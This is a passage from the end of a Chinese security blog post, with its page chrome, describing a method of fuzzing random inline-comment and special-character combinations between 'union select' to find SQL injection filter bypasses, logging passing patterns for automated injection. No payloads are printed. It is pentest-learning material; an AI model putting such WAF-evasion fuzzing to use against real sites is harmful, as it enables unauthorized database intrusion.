<p>这里将fuzz常用到的内联注释、特殊字符等，随机组合，循环添加到union select之间，如果返回的页面正常显示user，没有进入防护系统的拦截界面，说明这里的表达式没有被过滤，然后写到results.txt中保存。</p>
<p>之后我们可以利用results.txt分析到的规则，再完善前面的其他脚本，进行自动化注入。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>做测试时不能总是依赖sqlmap等完全自动化工具，也不能完全依赖手注，根据面对的实际情况编写适当的脚本，才能更熟练的掌握这些漏洞。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="麻薯" />
          <p class="site-author-name" itemprop="name">麻薯</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">95</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">24</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">61</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        

		
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">麻薯</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  






  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  




	





  





  





  






  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
</body>
</html>
